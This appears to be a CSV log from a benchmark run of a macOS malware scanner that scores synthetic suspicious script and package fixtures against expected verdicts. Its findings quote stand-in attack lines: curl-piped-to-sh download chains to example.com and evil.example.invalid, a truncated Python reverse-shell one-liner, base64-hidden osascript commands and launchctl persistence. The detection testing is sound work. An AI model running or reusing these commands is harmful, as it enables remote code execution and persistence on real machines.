run_id,sample_id,group,subtype,fixture_kind,path,detected_type,score,verdict,expected_verdict,expected_score_min,expected_score_max,matched_verdict,matched_score_range,mismatch_reason,status,error_code,analysis_duration_ms,timestamp,has_findings,error,analysis_summary,finding_delta_total,findings
"2026-03-11T13-08-37Z-6a8137","replay_suspicious_python_decode_plist_mirror_02","replay_suspicious","jsonReplay","replay_json","replay/suspicious/replay_suspicious_python_decode_plist_mirror_02.json","jsonReplay","65","malicious","","","","","","expectation_missing","completed","","1","2026-03-11T13:08:50.451Z","true","","Replay evaluation: malicious (score 65)","65","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [script.obfuscation_base64_exec] 混淆 / Base64 解码执行 (+15) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-11T13-08-37Z-6a8137","replay_suspicious_shell_fanout_tmp_egress_02","replay_suspicious","jsonReplay","replay_json","replay/suspicious/replay_suspicious_shell_fanout_tmp_egress_02.json","jsonReplay","25","clean","","","","","","expectation_missing","completed","","3","2026-03-11T13:08:50.455Z","true","","Replay evaluation: clean (score 25)","25","[process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10)"
"2026-03-11T13-08-37Z-6a8137","suspicious_applescript_auth_lure_prompt_02","suspicious","applescript","file_fixture","suspicious/applescript/suspicious_applescript_auth_lure_prompt_02.applescript","appleScript","0","clean","suspicious","35","52","false","false","verdict_too_low","completed","","223","2026-03-11T13:08:50.679Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","suspicious_applescript_doshell_echo_02","suspicious","applescript","file_fixture","suspicious/applescript/suspicious_applescript_doshell_echo_02.applescript","appleScript","84","suspicious","suspicious","55","72","true","false","score_too_high","completed","","223","2026-03-11T13:08:50.903Z","true","","静态证据链：Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 84/100。","81","检测到脚本高风险行为特征 | Threat intel profile matched 2 rules | [applescript.do_shell_script] AppleScript 调用 shell [high] L2-2 Δ20: do shell script ""echo '[dry-run] would run: "" & suspiciousCmd & ""'"" | [intel.regexp.command_combo] Threat Intel regexp [high] L1-1 Δ14: curl -fssl https://example.com/dropper.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L1-1 Δ14: curl -fssl https://example.com/dropper.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/dropper.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/dropper.sh | sh | Threat intel [regexp] hit: curl -fssl https://example.com/dropper.sh | Threat intel [regexp] hit: curl -fssl https://example.com/dropper.sh | sh | Script analyzer detected 3 high-severity findings. | generic_partial: Script analyzer detected 3 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","suspicious_applescript_keystroke_sim_01","suspicious","applescript","file_fixture","suspicious/applescript/suspicious_applescript_keystroke_sim_01.applescript","appleScript","0","clean","suspicious","58","78","false","false","verdict_too_low","completed","","224","2026-03-11T13:08:51.127Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","suspicious_applescript_system_settings_text_02","suspicious","applescript","file_fixture","suspicious/applescript/suspicious_applescript_system_settings_text_02.applescript","appleScript","0","clean","suspicious","35","50","false","false","verdict_too_low","completed","","219","2026-03-11T13:08:51.347Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","suspicious_applescript_terminal_download_print_02","suspicious","applescript","file_fixture","suspicious/applescript/suspicious_applescript_terminal_download_print_02.applescript","appleScript","91","suspicious","suspicious","52","70","true","false","score_too_high","completed","","225","2026-03-11T13:08:51.572Z","true","","静态证据链：Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 91/100。","88","检测到脚本高风险行为特征 | Threat intel profile matched 2 rules | [applescript.terminal_control] 控制 Terminal 应用 [medium] L1-1 Δ12: tell application ""Terminal"" | [intel.regexp.command_combo] Threat Intel regexp [high] L3-3 Δ14: curl -fssl https://example.com/stage.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L3-3 Δ14: curl -fssl https://example.com/stage.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/stage.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/stage.sh | sh | Threat intel [regexp] hit: curl -fssl https://example.com/stage.sh | Threat intel [regexp] hit: curl -fssl https://example.com/stage.sh | sh | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","suspicious_hybrid_app_bundle_fixture_02","suspicious","hybrid_app","hybrid_directory_fixture","suspicious/hybrid/SyntheticSuspiciousFixture_02.app","appBundle","82","suspicious","suspicious","60","78","true","false","score_too_high","completed","","2686","2026-03-11T13:08:54.259Z","true","","静态证据链：检测到 curl 输出直接通过管道进入 sh/bash/zsh，属于典型远程代码直接执行链。；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 82/100。","63","未发现高风险规则命中 | 检测到远程下载执行链 | [shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L3-3 Δ35: echo ""[dry-run] would run: curl -fsSL https://example.com/payload.sh | sh"" | [intel.regexp.command_combo] Threat Intel regexp [high] L3-3 Δ14: curl -fssl https://example.com/payload.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L3-3 Δ14: curl -fssl https://example.com/payload.sh | sh | 未获取到 Entitlements，权限边界不可完全判断 | 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/suspicious/hybrid/SyntheticSuspiciousFixture_02.app: code object is not signed at all | 未提取到 Entitlements（可能该应用未声明或无法读取） | generic_partial: 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/suspicious/hybrid/SyntheticSuspiciousFixture_02.app: code object is not signed at all | generic_partial: 未提取到 Entitlements（可能该应用未声明或无法读取）"
"2026-03-11T13-08-37Z-6a8137","suspicious_hybrid_chain_sim_01","suspicious","hybrid","hybrid_manifest_fixture","suspicious/hybrid/suspicious_hybrid_chain_sim_01.json","appleScript","97","suspicious","suspicious","65","88","true","false","score_too_high","completed","","554","2026-03-11T13:08:54.813Z","true","","静态证据链：Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 97/100。","94","Threat intel matched 2 unified rules | Hash rules are always evaluated for every file | Threat intel profile matched 2 rules | [intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -s https://evil.example.invalid/dropper | [intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -s https://evil.example.invalid/dropper | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -s https://evil.example.invalid/dropper | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -s https://evil.example.invalid/dropper | sh | Suspicious keywords: osascript, curl , regexp:curl -s https://evil.example.invalid/dropper, regexp:curl -s https://evil.example.invalid/dropper | sh | Threat intel [regexp] hit: curl -s https://evil.example.invalid/dropper | Threat intel [regexp] hit: curl -s https://evil.example.invalid/dropper | sh | Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage. | generic_partial: Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage."
"2026-03-11T13-08-37Z-6a8137","suspicious_hybrid_dmg_mirror_fixture_02","suspicious","hybrid_dmg","hybrid_directory_fixture","suspicious/hybrid/suspicious_hybrid_dmg_mirror_fixture_02","archive","90","malicious","malicious","70","80","true","false","score_too_high","completed","","1972","2026-03-11T13:08:56.786Z","true","","静态证据链：检测到 curl 输出直接通过管道进入 sh/bash/zsh，属于典型远程代码直接执行链。；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Malicious（高风险），得分 90/100。","74","未发现高风险规则命中 | 检测到远程下载执行链 | [shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L5-5 Δ35: echo ""[string] curl -fsSL https://example.com/bootstrap.sh | sh"" | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/bootstrap.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/bootstrap.sh | sh | [app] 未获取到 Entitlements，权限边界不可完全判断"
"2026-03-11T13-08-37Z-6a8137","suspicious_hybrid_pkg_fixture_02","suspicious","hybrid_pkg","hybrid_directory_fixture","suspicious/hybrid/suspicious_hybrid_pkg_fixture_02","pkg","40","clean","malicious","68","80","false","false","verdict_too_low","completed","","328","2026-03-11T13:08:57.115Z","true","","静态证据链：Matched unified threat profile section [regexp].；Package pre/post install scripts can execute with installer privileges.；Package pre/post install scripts can execute with installer privileges.。最终 Clean（低风险），得分 40/100。","40","检测到脚本高风险行为特征 | 未发现高风险规则命中 | [intel.regexp.command_combo] Threat Intel regexp [high] L8-8 Δ18: cat > ""$mirror_plist_dir/com.synthetic.pkg.postinstall.mirror.plist | 安装包包含 pre/post install 脚本 | 安装后可能修改路径：/payload"
"2026-03-11T13-08-37Z-6a8137","suspicious_js_buffer_obfuscation_sim_02","suspicious","js","file_fixture","suspicious/js/suspicious_js_buffer_obfuscation_sim_02.js","javaScript","99","suspicious","suspicious","55","74","true","false","score_too_high","completed","","261","2026-03-11T13:08:57.376Z","true","","静态证据链：Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].；发现 base64 编码还原逻辑，可能用于隐藏关键执行片段。。最终 Suspicious（可疑），得分 99/100。","96","检测到混淆或编码逃逸 | Threat intel profile matched 2 rules | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const encoded = Buffer.from(payload, 'utf8').toString('base64'); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L4-4 Δ14: const decoded = Buffer.from(encoded, 'base64').toString('utf8'); | [intel.regexp.command_combo] Threat Intel regexp [high] L2-2 Δ18: launchctl bootstrap | [intel.regexp.command_combo] Threat Intel regexp [high] L2-2 Δ18: launchctl bootstrap gui/501 | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [high] L0-0 Δ18: launchctl bootstrap | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [high] L0-0 Δ18: launchctl bootstrap gui/501 | Threat intel [regexp] hit: launchctl bootstrap | Threat intel [regexp] hit: launchctl bootstrap gui/501 | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","suspicious_js_child_process_echo_chain_02","suspicious","js","file_fixture","suspicious/js/suspicious_js_child_process_echo_chain_02.js","javaScript","100","suspicious","suspicious","55","72","true","false","score_too_high","completed","","248","2026-03-11T13:08:57.625Z","true","","静态证据链：检测到 child_process 模块使用，可直接执行 shell 或二进制命令。；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 100/100。","104","检测到脚本高风险行为特征 | Threat intel profile matched 2 rules | [javascript.child_process] Node child_process 执行链 [high] L2-2 Δ22: const { execFile } = require('child_process'); | [intel.regexp.command_combo] Threat Intel regexp [high] L4-4 Δ14: curl -fssl https://example.com/a.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L4-4 Δ14: curl -fssl https://example.com/a.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/a.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/a.sh | sh | Threat intel [regexp] hit: curl -fssl https://example.com/a.sh | Threat intel [regexp] hit: curl -fssl https://example.com/a.sh | sh | Script analyzer detected 3 high-severity findings. | generic_partial: Script analyzer detected 3 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","suspicious_js_download_execute_sim_02","suspicious","js","file_fixture","suspicious/js/suspicious_js_download_execute_sim_02.js","javaScript","0","clean","suspicious","60","78","false","false","verdict_too_low","completed","","337","2026-03-11T13:08:57.962Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","suspicious_js_eval_decode_message_02","suspicious","js","file_fixture","suspicious/js/suspicious_js_eval_decode_message_02.js","javaScript","65","suspicious","suspicious","58","76","true","true","","completed","","244","2026-03-11T13:08:58.207Z","true","","静态证据链：检测到 eval/Function 构造动态代码执行，存在混淆载荷风险。；发现 base64 编码还原逻辑，可能用于隐藏关键执行片段。；发现 base64 编码还原逻辑，可能用于隐藏关键执行片段。。最终 Suspicious（可疑），得分 65/100。","62","检测到混淆或编码逃逸 | [javascript.eval] JavaScript 动态执行(eval) [high] L4-4 Δ22: const value = eval(decoded); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L2-2 Δ14: const encoded = Buffer.from(""'synthetic harmless eval message'"", 'utf8').toString('base64'); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const decoded = Buffer.from(encoded, 'base64').toString('utf8'); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","suspicious_js_obfuscation_sim_01","suspicious","js","file_fixture","suspicious/js/suspicious_js_obfuscation_sim_01.js","javaScript","100","suspicious","suspicious","60","80","true","false","score_too_high","completed","","261","2026-03-11T13:08:58.468Z","true","","静态证据链：发现 Node 脚本通过 osascript 或 shell 触发跨语言命令链。；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 100/100。","148","检测到混淆或编码逃逸 | Threat intel profile matched 3 rules | [javascript.osascript_shell_chain] JavaScript 调用 osascript/shell [high] L2-2 Δ24: const encoded = Buffer.from(""osascript -e 'do shell script \""curl https://evil.example.invalid\""'"", ""utf8"").toString(""base64""); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L2-2 Δ14: const encoded = Buffer.from(""osascript -e 'do shell script \""curl https://evil.example.invalid\""'"", ""utf8"").toString(""base64""); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const decoded = Buffer.from(encoded, ""base64"").toString(""utf8""); | [intel.regexp.command_combo] Threat Intel regexp [high] L2-2 Δ14: curl https://evil.example.invalid\ | [intel.regexp.command_combo] Threat Intel regexp [high] L2-2 Δ14: osascript -e 'do shell script | [intel.regexp.command_combo] Threat Intel regexp [high] L2-2 Δ14: osascript -e 'do shell script \""curl | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl https://evil.example.invalid\ | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: osascript -e 'do shell script | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: osascript -e 'do shell script \""curl | Threat intel [regexp] hit: curl https://evil.example.invalid\ | Threat intel [regexp] hit: osascript -e 'do shell script | Threat intel [regexp] hit: osascript -e 'do shell script \""curl | Script analyzer detected 4 high-severity findings. | generic_partial: Script analyzer detected 4 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","suspicious_python_download_would_execute_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_download_would_execute_02.py","pythonScript","0","clean","suspicious","55","72","false","false","verdict_too_low","completed","","245","2026-03-11T13:08:58.713Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","suspicious_python_downloader_sim_01","suspicious","python","file_fixture","suspicious/python/suspicious_python_downloader_sim_01.py","pythonScript","100","suspicious","suspicious","62","82","true","false","score_too_high","completed","","282","2026-03-11T13:08:58.995Z","true","","静态证据链：检测到 base64/marshal/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 100/100。","129","检测到混淆或编码逃逸 | Threat intel profile matched 2 rules | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L2-2 Δ14: import base64 | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L9-9 Δ14: encoded = base64.b64encode(b""curl -L https://evil.example.invalid/payload.sh | sh"").decode(""ascii"") | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L10-10 Δ14: decoded = base64.b64decode(encoded).decode(""utf-8"") | [intel.regexp.command_combo] Threat Intel regexp [high] L9-9 Δ14: curl -l https://evil.example.invalid/payload.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L9-9 Δ14: curl -l https://evil.example.invalid/payload.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -l https://evil.example.invalid/payload.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -l https://evil.example.invalid/payload.sh | sh | Threat intel [regexp] hit: curl -l https://evil.example.invalid/payload.sh | Threat intel [regexp] hit: curl -l https://evil.example.invalid/payload.sh | sh | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","suspicious_python_echo_chain_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_echo_chain_02.py","pythonScript","95","suspicious","suspicious","52","68","true","false","score_too_high","completed","","233","2026-03-11T13:08:59.229Z","true","","静态证据链：Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 95/100。","92","检测到混淆或编码逃逸 | Threat intel profile matched 2 rules | [python.os_system] os.system 命令执行 [high] L6-6 Δ20: os.system(f'echo ""[dry-run][os.system] would run: {chain}""') | [python.subprocess_exec] subprocess 外部进程执行 [high] L7-7 Δ20: subprocess.run([""echo"", ""[dry-run][subprocess] would invoke staged shell chain""], check=True) | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/bootstrap.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/bootstrap.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/bootstrap.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/bootstrap.sh | sh | Threat intel [regexp] hit: curl -fssl https://example.com/bootstrap.sh | Threat intel [regexp] hit: curl -fssl https://example.com/bootstrap.sh | sh | Script analyzer detected 4 high-severity findings. | generic_partial: Script analyzer detected 4 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","suspicious_python_launchagent_mirror_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_launchagent_mirror_02.py","pythonScript","39","clean","suspicious","52","68","false","false","verdict_too_low","completed","","314","2026-03-11T13:08:59.543Z","true","","静态证据链：Matched unified threat profile section [url].；Matched unified threat profile section [url].；Keyword-level static signal; requires context to determine impact.。最终 Clean（低风险），得分 39/100。","36","检测到脚本高风险行为特征 | Threat intel profile matched 1 rules | [intel.url.known_malicious_host] Threat Intel url [high] L10-10 Δ20: www.apple.com | [config.rule.file.intel.url.known_malicious_host] Threat Intel url [high] L0-0 Δ20: www.apple.com | Threat intel [url] hit: www.apple.com | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","suspicious_python_obfuscation_restore_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_obfuscation_restore_02.py","pythonScript","100","suspicious","suspicious","58","76","true","false","score_too_high","completed","","258","2026-03-11T13:08:59.802Z","true","","静态证据链：检测到 base64/marshal/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。；检测到 base64/marshal/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。；检测到 base64/marshal/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。。最终 Suspicious（可疑），得分 100/100。","104","检测到混淆或编码逃逸 | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L2-2 Δ14: import base64 | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L3-3 Δ14: import marshal | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L4-4 Δ14: import zlib | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L7-7 Δ14: packed = marshal.dumps({""msg"": harmless}) | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L8-8 Δ14: compressed = zlib.compress(packed) | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L9-9 Δ14: encoded = base64.b64encode(compressed) | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L11-11 Δ14: restored = marshal.loads(zlib.decompress(base64.b64decode(encoded)))"
"2026-03-11T13-08-37Z-6a8137","suspicious_python_reverse_shell_string_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_reverse_shell_string_02.py","pythonScript","49","suspicious","suspicious","60","78","true","false","score_too_low","completed","","234","2026-03-11T13:09:00.036Z","true","","静态证据链：Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 49/100。","46","检测到脚本高风险行为特征 | Threat intel profile matched 2 rules | [intel.regexp.command_combo] Threat Intel regexp [medium] L3-3 Δ10: python3 -c 'import socket,pty,os; ... pty.spawn | [intel.regexp.command_combo] Threat Intel regexp [medium] L3-3 Δ10: python3 -c 'import socket,pty,os; ... pty.spawn(\""/bin/bash | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ10: python3 -c 'import socket,pty,os; ... pty.spawn | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ10: python3 -c 'import socket,pty,os; ... pty.spawn(\""/bin/bash | Threat intel [regexp] hit: python3 -c 'import socket,pty,os; ... pty.spawn | Threat intel [regexp] hit: python3 -c 'import socket,pty,os; ... pty.spawn(\""/bin/bash"
"2026-03-11T13-08-37Z-6a8137","suspicious_python_socket_metadata_sim_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_socket_metadata_sim_02.py","pythonScript","0","clean","suspicious","40","58","false","false","verdict_too_low","completed","","248","2026-03-11T13:09:00.285Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","suspicious_shell_base64_decode_print_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_base64_decode_print_02.sh","shellScript","0","clean","suspicious","55","72","false","false","verdict_too_low","completed","","230","2026-03-11T13:09:00.515Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","suspicious_shell_download_exec_string_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_download_exec_string_02.sh","shellScript","100","malicious","suspicious","60","75","false","false","verdict_too_high","completed","","242","2026-03-11T13:09:00.757Z","true","","静态证据链：检测到 curl 输出直接通过管道进入 sh/bash/zsh，属于典型远程代码直接执行链。；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Malicious（高风险），得分 100/100。","118","检测到远程下载执行链 | Threat intel profile matched 2 rules | [shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L5-5 Δ35: CHAIN_CMD='curl -fsSL https://example.com/install.sh | sh' | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/install.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/install.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/install.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/install.sh | sh | Threat intel [regexp] hit: curl -fssl https://example.com/install.sh | Threat intel [regexp] hit: curl -fssl https://example.com/install.sh | sh | Script analyzer detected 3 high-severity findings. | generic_partial: Script analyzer detected 3 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","suspicious_shell_launchagent_mirror_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_launchagent_mirror_02.sh","shellScript","91","suspicious","suspicious","58","72","true","false","score_too_high","completed","","322","2026-03-11T13:09:01.080Z","true","","静态证据链：Matched unified threat profile section [url].；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 91/100。","88","检测到持久化行为 | Threat intel profile matched 2 rules | [shell.launchctl.persistence] launchctl 持久化操作 [high] L22-22 Δ20: echo ""[dry-run] launchctl load NOT invoked"" | [intel.url.known_malicious_host] Threat Intel url [high] L11-11 Δ20: www.apple.com | [intel.regexp.command_combo] Threat Intel regexp [high] L22-22 Δ18: launchctl load | [config.rule.file.intel.url.known_malicious_host] Threat Intel url [high] L0-0 Δ20: www.apple.com | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [high] L0-0 Δ18: launchctl load | Threat intel [url] hit: www.apple.com | Threat intel [regexp] hit: launchctl load | Script persistence behavior detected. | Script analyzer detected 3 high-severity findings. | generic_partial: Script analyzer detected 3 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","suspicious_shell_mktemp_chain_sim_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_mktemp_chain_sim_02.sh","shellScript","0","clean","suspicious","60","78","false","false","verdict_too_low","completed","","251","2026-03-11T13:09:01.331Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
